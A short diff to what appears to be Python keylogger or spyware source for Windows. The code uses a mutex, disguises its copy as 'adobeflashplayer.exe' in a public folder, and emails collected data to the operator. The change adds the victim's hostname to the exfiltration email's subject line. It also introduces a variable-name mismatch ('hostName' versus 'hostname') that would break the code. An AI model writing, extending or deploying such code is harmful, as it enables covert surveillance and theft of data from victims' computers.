@@ -11,6 +11,7 @@ import win32event, win32api, winerror
 from _winreg import *
 import shutil
 import sys
+import socket
 
 ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
@@ -21,6 +22,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 x=''
 data=''
 count=0
+hostName=socket.gethostname()
 
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"
 
@@ -47,7 +49,7 @@ class TimerClass(threading.Thread):
                 PASS = EPASS
                 FROM = USER
                 TO = [USER]
-                SUBJECT = "B33: "+str(ts) 
+                SUBJECT = hostname+" - "+"B33: "+str(ts) 
                 MESSAGE =  data 
                 message = """\ 
 From: %s
